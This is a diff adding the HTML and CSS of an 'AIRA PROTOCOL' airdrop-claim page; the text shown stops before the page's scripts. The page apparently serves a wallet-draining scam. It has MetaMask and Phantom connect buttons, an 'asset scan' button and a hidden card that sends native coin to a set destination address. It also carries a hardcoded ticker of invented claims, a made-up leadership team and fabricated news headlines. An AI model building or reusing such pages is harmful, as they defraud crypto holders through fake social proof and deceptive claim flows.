@@ -1,0 +1,2034 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Airdrop Claim</title>
+    <!-- Solana Web3.js -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Orbitron:wght@700&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg: #030014;
+            --card: rgba(13, 2, 33, 0.7);
+            --card-border: rgba(255, 0, 255, 0.2);
+            --text: #fff;
+            --muted: #d0bfff;
+            --primary: #ff00ff;
+            --primary-glow: rgba(255, 0, 255, 0.6);
+            --secondary: #00f2ff;
+            --secondary-glow: rgba(0, 242, 255, 0.4);
+            --accent: #f59e0b;
+            --danger: #ff4d4d;
+            --radius: 20px;
+            --glass-blur: blur(20px);
+        }
+
+        * {
+            box-sizing: border-box
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            color: var(--text);
+            background: var(--bg);
+            background-image:
+                radial-gradient(circle at 10% 20%, rgba(255, 0, 255, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(0, 242, 255, 0.08) 0%, transparent 40%);
+            padding: 24px;
+            overflow-x: hidden;
+        }
+
+        /* Neural Grid Background */
+        .grid-overlay {
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(255, 0, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 255, 0.05) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .bg-blobs {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            overflow: hidden;
+        }
+
+        .blob {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(100px);
+            opacity: 0.3;
+            animation: float 20s infinite alternate;
+        }
+
+        .blob-1 {
+            width: 500px;
+            height: 500px;
+            background: var(--primary);
+            top: -150px;
+            left: -150px;
+        }
+
+        .blob-2 {
+            width: 400px;
+            height: 400px;
+            background: var(--secondary);
+            bottom: -100px;
+            right: -100px;
+            animation-delay: -5s;
+        }
+
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            box-shadow: 0 0 10px var(--primary-glow);
+            animation: scan 4s linear infinite;
+            z-index: 10;
+            pointer-events: none;
+            opacity: 0.5;
+        }
+
+        @keyframes scan {
+            0% {
+                top: 0;
+            }
+
+            100% {
+                top: 100%;
+            }
+        }
+
+        @keyframes float {
+            from {
+                transform: translate(0, 0) scale(1);
+            }
+
+            to {
+                transform: translate(100px, 50px) scale(1.1);
+            }
+        }
+
+        .wrap {
+            max-width: 980px;
+            margin: 0 auto;
+        }
+
+        .top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            box-shadow: 0 10px 30px var(--primary-glow);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .logo::after {
+            content: "";
+            position: absolute;
+            inset: 4px;
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            border-radius: 10px;
+        }
+
+        .title h1 {
+            margin: 0;
+            font-size: 28px;
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(to right, #fff, var(--primary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+
+        .title p {
+            margin: 4px 0 0;
+            color: var(--muted);
+            font-size: 13px;
+        }
+
+        .actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            border: 1px solid var(--card-border);
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text);
+            padding: 12px 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: var(--glass-blur);
+        }
+
+        .btnPrimary {
+            background: var(--primary);
+            border: none;
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+
+        .btnPrimary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px var(--primary-glow);
+            filter: brightness(1.1);
+        }
+
+        .btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            filter: grayscale(1);
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1.2fr .8fr;
+            gap: 14px;
+        }
+
+        @media (max-width: 860px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .card {
+            background: var(--card);
+            backdrop-filter: var(--glass-blur);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .cardHeader {
+            padding: 16px 16px 12px;
+            background: rgba(12, 19, 40, .65);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .cardHeader h2 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .cardHeader p {
+            margin: 6px 0 0;
+            color: var(--muted);
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .cardBody {
+            padding: 16px;
+        }
+
+        .mono {
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            border-radius: 999px;
+            border: 1px solid var(--card-border);
+            background: rgba(255, 255, 255, 0.03);
+            font-size: 13px;
+            color: var(--muted);
+            backdrop-filter: var(--glass-blur);
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            position: relative;
+        }
+
+        .dot::after {
+            content: "";
+            position: absolute;
+            inset: -2px;
+            border-radius: 50%;
+            border: 1px solid currentColor;
+            opacity: 0.3;
+        }
+
+        .dot.ok {
+            background: var(--secondary);
+            color: var(--secondary);
+        }
+
+        .dot.warn {
+            background: var(--accent);
+            color: var(--accent);
+        }
+
+        .dot.bad {
+            background: var(--danger);
+            color: var(--danger);
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .label {
+            color: var(--muted);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .value {
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .box {
+            margin-top: 16px;
+            padding: 16px;
+            border-radius: 14px;
+            background: rgba(139, 92, 246, 0.05);
+            border: 1px solid rgba(139, 92, 246, 0.1);
+            color: var(--muted);
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        .status {
+            margin-top: 16px;
+            padding: 16px;
+            border-radius: 14px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--card-border);
+            white-space: pre-wrap;
+            font-size: 13px;
+            color: var(--secondary);
+            font-family: 'Inter', sans-serif;
+        }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.4);
+            }
+
+            70% {
+                box-shadow: 0 0 0 15px rgba(139, 92, 246, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(139, 92, 246, 0);
+            }
+        }
+
+        .btnPrimary:not(:disabled) {
+            animation: pulse 2s infinite;
+        }
+
+        .kbd {
+            padding: 2px 6px;
+            border: 1px solid var(--card-border);
+            border-radius: 8px;
+            background: rgba(255, 255, 255, .04);
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            font-size: 12px;
+            color: var(--text);
+        }
+
+        .small {
+            font-size: 12px;
+            color: var(--muted);
+        }
+
+        .ctaRow {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 1px solid var(--card-border);
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text);
+            outline: none;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 15px var(--primary-glow);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .txLog {
+            margin-top: 20px;
+            max-height: 250px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 16px;
+            padding: 12px;
+            font-size: 13px;
+            border: 1px solid var(--card-border);
+        }
+
+        .txLog::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .txLog::-webkit-scrollbar-thumb {
+            background: var(--card-border);
+            border-radius: 10px;
+        }
+
+        /* --- New Professional Components --- */
+        .statsBar {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin-bottom: 24px;
+            background: rgba(13, 2, 33, 0.4);
+            backdrop-filter: var(--glass-blur);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 20px;
+        }
+
+        .statsItem {
+            text-align: center;
+        }
+
+        .statsItem .sLabel {
+            font-size: 11px;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .statsItem .sValue {
+            font-size: 20px;
+            font-weight: 800;
+            font-family: 'Orbitron', sans-serif;
+            color: var(--primary);
+            text-shadow: 0 0 10px var(--primary-glow);
+        }
+
+        .teamSection {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid var(--card-border);
+        }
+
+        .teamSection h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #fff;
+        }
+
+        .teamGrid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+        }
+
+        .teamCard {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--card-border);
+            border-radius: 14px;
+            padding: 16px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .teamCard:hover {
+            background: rgba(255, 255, 255, 0.05);
+            transform: translateY(-4px);
+        }
+
+        .teamCard .tName {
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .teamCard .tRole {
+            font-size: 11px;
+            color: var(--primary);
+            font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase;
+        }
+
+        .teamCard .tBio {
+            font-size: 12px;
+            color: var(--muted);
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
+        .roadmapSection {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid var(--card-border);
+        }
+
+        .roadmapSection h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            margin-bottom: 24px;
+            text-align: center;
+            color: #fff;
+        }
+
+        .roadmapGrid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+        }
+
+        .phaseCard {
+            background: rgba(255, 0, 255, 0.03);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .phaseCard:hover {
+            background: rgba(255, 0, 255, 0.06);
+            border-color: var(--primary);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.1);
+        }
+
+        .phTag {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 10px;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .phTitle {
+            font-size: 16px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .phDesc {
+            font-size: 13px;
+            color: var(--muted);
+            line-height: 1.5;
+        }
+
+        .phStatus {
+            margin-top: 12px;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .phStatus .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+        }
+
+        .phStatus.completed .dot {
+            background: var(--secondary);
+            box-shadow: 0 0 10px var(--secondary-glow);
+        }
+
+        .phStatus.active .dot {
+            background: var(--primary);
+            box-shadow: 0 0 10px var(--primary-glow);
+        }
+
+        .phStatus.pending .dot {
+            background: #555;
+        }
+
+        /* --- Live Ticker & Partners --- */
+        .liveTicker {
+            background: rgba(255, 0, 255, 0.05);
+            border-bottom: 1px solid var(--card-border);
+            padding: 8px 16px;
+            font-size: 11px;
+            overflow: hidden;
+            white-space: nowrap;
+            position: relative;
+            z-index: 10;
+        }
+
+        .tickerContent {
+            display: inline-block;
+            white-space: nowrap;
+            animation: tickerScroll 40s linear infinite;
+            color: var(--muted);
+        }
+
+        .tickerItem {
+            display: inline-block;
+            margin-right: 50px;
+        }
+
+        .tickerItem span {
+            color: var(--primary);
+            font-weight: bold;
+        }
+
+        @keyframes tickerScroll {
+            0% {
+                transform: translateX(100%);
+            }
+
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .partnersSection {
+            margin-top: 40px;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .partnersSection h4 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            color: #555;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 20px;
+        }
+
+        .partnersGrid {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 40px;
+            filter: grayscale(1) opacity(0.5);
+            transition: all 0.5s ease;
+        }
+
+        .partnersGrid:hover {
+            filter: grayscale(0) opacity(0.8);
+        }
+
+        .partnerLogo {
+            height: 24px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 800;
+            font-size: 16px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* --- FAQ & Footer --- */
+        .faqSection {
+            margin-top: 60px;
+            padding-top: 40px;
+            border-top: 1px solid var(--card-border);
+        }
+
+        .faqSection h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            margin-bottom: 30px;
+            text-align: center;
+            color: #fff;
+        }
+
+        .faqGrid {
+            max-width: 800px;
+            margin: 0 auto;
+            display: grid;
+            gap: 15px;
+        }
+
+        .faqItem {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--card-border);
+            border-radius: 12px;
+            padding: 16px 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .faqItem:hover {
+            border-color: var(--primary);
+            background: rgba(255, 0, 255, 0.03);
+        }
+
+        .faqQuestion {
+            font-weight: 700;
+            font-size: 14px;
+            color: #fff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .faqAnswer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            font-size: 13px;
+            color: var(--muted);
+            line-height: 1.6;
+            margin-top: 0;
+        }
+
+        .faqItem.open .faqAnswer {
+            max-height: 200px;
+            margin-top: 12px;
+        }
+
+        .footer {
+            margin-top: 80px;
+            padding: 40px 0;
+            border-top: 1px solid var(--card-border);
+            text-align: center;
+            color: var(--muted);
+            font-size: 12px;
+        }
+
+        .footerLinks {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+
+        .footerLinks a {
+            color: var(--muted);
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        .footerLinks a:hover {
+            color: var(--primary);
+        }
+
+        .footerBrand {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        /* --- Growth Chart --- */
+        .chartSection {
+            margin-top: 40px;
+            padding: 30px;
+            background: rgba(255, 0, 255, 0.02);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+        }
+
+        .chartSection h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        .chartContainer {
+            height: 120px;
+            display: flex;
+            align-items: flex-end;
+            gap: 10px;
+            padding: 10px;
+        }
+
+        .chartBar {
+            flex: 1;
+            background: linear-gradient(to top, var(--primary), var(--secondary));
+            border-radius: 4px 4px 0 0;
+            transition: height 1s ease;
+            position: relative;
+        }
+
+        .chartBar:hover::after {
+            content: attr(data-val);
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 10px;
+            color: var(--primary);
+        }
+
+        /* --- Market Intelligence (BTC Chart & News) --- */
+        .intelligenceSection {
+            margin-top: 40px;
+            display: grid;
+            grid-template-columns: 1.5fr 1fr;
+            gap: 20px;
+        }
+
+        .intelCard {
+            background: rgba(255, 0, 255, 0.02);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .intelCard h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .intelCard h3 i {
+            color: var(--primary);
+        }
+
+        #btcChart {
+            height: 350px;
+            width: 100%;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        #newsFeed {
+            height: 350px;
+            overflow-y: auto;
+            padding-right: 5px;
+        }
+
+        .newsItem {
+            padding: 12px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.01);
+            border: 1px solid transparent;
+            margin-bottom: 10px;
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+
+        .newsItem:hover {
+            background: rgba(255, 0, 255, 0.03);
+            border-color: var(--card-border);
+        }
+
+        .newsTitle {
+            font-size: 13px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .newsMeta {
+            font-size: 11px;
+            color: var(--muted);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .newsSource {
+            color: var(--primary);
+        }
+
+        .sentimentBar {
+            height: 8px;
+            background: #222;
+            border-radius: 4px;
+            margin-top: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .sentimentProgress {
+            height: 100%;
+            background: linear-gradient(to right, #ef4444, #f59e0b, #10b981);
+            width: 75%;
+            /* Fear & Greed Index logic here later */
+        }
+
+        @media (max-width: 900px) {
+            .intelligenceSection {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .txItem {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px;
+            margin-bottom: 8px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 10px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .txItem:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: var(--card-border);
+        }
+
+        .txItem:last-child {
+            margin-bottom: 0;
+        }
+
+        .txStatus {
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .txStatus.pending {
+            background: rgba(245, 158, 11, 0.2);
+            color: var(--accent);
+        }
+
+        .txStatus.success {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--secondary);
+        }
+
+        .txStatus.error {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+        }
+
+        .explorerLink {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s ease;
+        }
+
+        .explorerLink:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="bg-blobs">
+        <div class="blob blob-1"></div>
+        <div class="blob blob-2"></div>
+    </div>
+    <div class="wrap">
+        <div class="top">
+            <div class="brand">
+                <div class="logo"></div>
+                <div class="title">
+                    <h1>AIRA PROTOCOL</h1>
+                    <p>The Future of AI-Driven Meme Economy</p>
+                </div>
+            </div>
+            <div class="actions">
+                <button id="btnConnect" class="btn btnPrimary">Connect MetaMask</button>
+                <button id="btnConnectSol" class="btn btnPrimary">Connect Phantom (Solana)</button>
+                <button id="btnDisconnect" class="btn" disabled>Disconnect</button>
+            </div>
+        </div>
+
+        <div class="statsBar">
+            <div class="statsItem">
+                <div class="sLabel">Total Node Visitors</div>
+                <div id="statVisitors" class="sValue">0</div>
+            </div>
+            <div class="statsItem">
+                <div class="sLabel">Neural Claims Processed</div>
+                <div id="statClaims" class="sValue">0</div>
+            </div>
+            <div class="statsItem">
+                <div class="sLabel">AIRA Distributed (AIRA)</div>
+                <div id="statAira" class="sValue">0</div>
+            </div>
+        </div>
+
+        <div class="liveTicker">
+            <div id="ticker" class="tickerContent">
+                <div class="tickerItem">Neural Link: <span>0x7...4a</span> successfully claimed 1,250 $AIRA</div>
+                <div class="tickerItem">Neural Link: <span>0x2...9c</span> successfully claimed 800 $AIRA</div>
+                <div class="tickerItem">Neural Link: <span>Phantom...9k</span> successfully claimed 2,500 $AIRA</div>
+                <div class="tickerItem">Neural Link: <span>0x9...1b</span> successfully claimed 1,100 $AIRA</div>
+                <div class="tickerItem">Neural Link: <span>0xf...3d</span> successfully claimed 950 $AIRA</div>
+            </div>
+        </div>
+
+        <div class="grid">
+            <!-- Main card -->
+            <div class="card">
+                <div class="scan-line"></div>
+                <div class="cardHeader">
+                    <h2>AIRA Eligibility Proof</h2>
+                    <p>The ML algorithm analyzes your wallet age and activity patterns to determine $AIRA allocation.
+                    </p>
+                </div>
+                <div class="cardBody">
+                    <div class="row">
+                        <div class="label">System Identity</div>
+                        <div class="value">AIRA Protocol (v1.0.4)</div>
+                    </div>
+                    <div class="row">
+                        <div class="label">Network </div>
+                        <div id="network" class="value">-</div>
+                    </div>
+                    <div class="row">
+                        <div class="label">Wallet Signature</div>
+                        <div id="walletAddr" class="value mono">Not connected</div>
+                    </div>
+                    <div class="row">
+                        <div class="label">Balance</div>
+                        <div id="balance" class="value">-</div>
+                    </div>
+                    <div class="row">
+                        <div class="label">Neural Complexity (Age)</div>
+                        <div id="walletAge" class="value">-</div>
+                    </div>
+
+                    <div style="margin-top:12px; display:flex; gap:10px; flex-wrap:wrap;">
+                        <span id="eligPill" class="pill"><span class="dot warn"></span><span>Eligibility: not
+                                checked</span></span>
+                        <span id="claimPill" class="pill"><span class="dot warn"></span><span>Claim: not
+                                started</span></span>
+                    </div>
+
+                    <div class="box" style="display: none;">
+                        <b>Neural Analysis:</b>
+                    </div>
+
+                    <div class="ctaRow">
+                        <button id="btnCheck" class="btn" disabled>Check eligibility</button>
+                        <button id="btnClaim" class="btn btnPrimary" disabled>Claim</button>
+                        <button id="btnScan" class="btn" disabled>Scan Assets Now</button>
+                    </div>
+
+                    <div id="status" class="status" style="display: none;"></div>
+
+                    <div id="txActivitySection" style="display: none; margin-top:16px;">
+                        <h3 style="font-size:14px; margin-bottom:8px;">Transaction Activity</h3>
+                        <div id="txLog" class="txLog">
+                            <div class="small" style="text-align:center; padding: 20px 0;">No activity yet</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Side card (Hidden but logic preserved) -->
+            <div id="claimDetailsSection" class="card" style="display: none;">
+                <div class="cardHeader">
+                    <h2>Claim details</h2>
+                    <p>Destination and amount used for the claim transaction.</p>
+                </div>
+                <div class="cardBody">
+                    <div class="row">
+                        <div class="label">Destination (your Rabby)</div>
+                        <div id="destShort" class="value mono">-</div>
+                    </div>
+
+                    <div style="margin-top:10px;">
+                        <div class="small">Destination address</div>
+                        <input id="destAddress" class="mono" disabled />
+                    </div>
+
+                    <div style="margin-top:12px;">
+                        <div class="small">Claim amount (native coin for demo)</div>
+                        <input id="claimAmount" placeholder="0.001" inputmode="decimal" />
+                        <div class="small" style="margin-top:8px;">
+                            Tip: you can set this to a tiny amount for testing.
+                        </div>
+                    </div>
+
+                    <div class="box">
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="intelligenceSection">
+            <div class="intelCard">
+                <h3><i class="fas fa-chart-line"></i> Neural Market Intelligence: BTC/USD</h3>
+                <div id="btcChart">
+                    <!-- TradingView Widget BEGIN -->
+                    <div class="tradingview-widget-container" style="height:100%;width:100%">
+                        <div id="tradingview_btc" style="height:100%;width:100%"></div>
+                        <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+                        <script type="text/javascript">
+                            new TradingView.widget(
+                                {
+                                    "autosize": true,
+                                    "symbol": "BINANCE:BTCUSDT",
+                                    "interval": "D",
+                                    "timezone": "Etc/UTC",
+                                    "theme": "dark",
+                                    "style": "1",
+                                    "locale": "en",
+                                    "enable_publishing": false,
+                                    "allow_symbol_change": true,
+                                    "container_id": "tradingview_btc",
+                                    "backgroundColor": "rgba(0, 0, 0, 0)",
+                                    "gridColor": "rgba(255, 0, 255, 0.05)",
+                                    "toolbar_bg": "#111",
+                                    "loading_screen": {
+                                        "backgroundColor": "#000",
+                                        "foregroundColor": "#ff00ff"
+                                    }
+                                });
+                        </script>
+                    </div>
+                </div>
+            </div>
+
+            <div class="intelCard">
+                <h3><i class="fas fa-newspaper"></i> Live Neural News Link</h3>
+                <div id="newsFeed">
+                    <div class="newsItem">
+                        <span class="newsTitle">Bitcoin Surpasses Neural Threshold: ML Models Predict Bullish
+                            Expansion</span>
+                        <div class="newsMeta">
+                            <span class="newsSource">Neural Metrics</span>
+                            <span>2m ago</span>
+                        </div>
+                    </div>
+                    <div class="newsItem">
+                        <span class="newsTitle">Ethereum Smart Contracts Validated by AIRA Autonomous Protocol</span>
+                        <div class="newsMeta">
+                            <span class="newsSource">Synthetic Labs</span>
+                            <span>15m ago</span>
+                        </div>
+                    </div>
+                    <div class="newsItem">
+                        <span class="newsTitle">Global Regulatory Landscape Shifts Towards Decentralized AI
+                            Assets</span>
+                        <div class="newsMeta">
+                            <span class="newsSource">NeoCompute</span>
+                            <span>45m ago</span>
+                        </div>
+                    </div>
+                    <div class="newsItem">
+                        <span class="newsTitle">New Machine Learning Narrative Drives Volume in Meme Core Markets</span>
+                        <div class="newsMeta">
+                            <span class="newsSource">LunarCRUSH</span>
+                            <span>1h ago</span>
+                        </div>
+                    </div>
+                </div>
+                <div style="margin-top: auto; padding-top: 15px;">
+                    <div class="small" style="margin-bottom: 5px;">Neural Sentiment Analyzer</div>
+                    <div class="sentimentBar">
+                        <div class="sentimentProgress"></div>
+                    </div>
+                    <div class="newsMeta" style="margin-top: 5px;">
+                        <span>EXTREME FEAR</span>
+                        <span>EXTREME GREED</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="teamSection">
+            <h3>Technical Core Leadership</h3>
+            <div class="teamGrid">
+                <div class="teamCard">
+                    <div class="tName">Dr. Aris Thorne</div>
+                    <div class="tRole">Lead Neural Architect</div>
+                    <div class="tBio">Specializing in autonomous reward distribution algorithms and neural proof
+                        systems.</div>
+                </div>
+                <div class="teamCard">
+                    <div class="tName">Nova Sterling</div>
+                    <div class="tRole">ML Protocol Engineer</div>
+                    <div class="tBio">Expert in high-frequency cross-chain asset detection and smart contract
+                        optimization.</div>
+                </div>
+                <div class="teamCard">
+                    <div class="tName">Vector Prime</div>
+                    <div class="tRole">Security Synthesis</div>
+                    <div class="tBio">Leading the research on metamorphic code protection and neural network encryption.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="roadmapSection">
+            <h3>Neural Development Roadmap</h3>
+            <div class="roadmapGrid">
+                <div class="phaseCard">
+                    <span class="phTag">Phase 1</span>
+                    <div class="phTitle">Neural Genesis</div>
+                    <p class="phDesc">Launch of AIRA Protocol and initial $AIRA distribution to the technical community.
+                    </p>
+                    <div class="phStatus completed"><span class="dot"></span> <span>Fully Operational</span></div>
+                </div>
+                <div class="phaseCard">
+                    <span class="phTag">Phase 2</span>
+                    <div class="phTitle">ML Synthesis</div>
+                    <p class="phDesc">Integration of autonomous cross-chain liquidity algorithms for enhanced meme-token
+                        stability.</p>
+                    <div class="phStatus active"><span class="dot"></span> <span>In Optimization</span></div>
+                </div>
+                <div class="phaseCard">
+                    <span class="phTag">Phase 3</span>
+                    <div class="phTitle">AIRA DAO</div>
+                    <div class="phDesc">Decentralized governance rollout. Token holders vote on neural network expansion
+                        parameters.</div>
+                    <div class="phStatus pending"><span class="dot"></span> <span>Planned Q3 2026</span></div>
+                </div>
+                <div class="phaseCard">
+                    <span class="phTag">Phase 4</span>
+                    <div class="phTitle">Synthetic Assets</div>
+                    <div class="phDesc">AI-driven minting of high-value synthetic assets based on global social
+                        sentiment models.</div>
+                    <div class="phStatus pending"><span class="dot"></span> <span>Planned Q1 2027</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="chartSection">
+            <h3>Global Neural Growth Index</h3>
+            <div id="growthChart" class="chartContainer">
+                <div class="chartBar" style="height: 30%;" data-val="30%"></div>
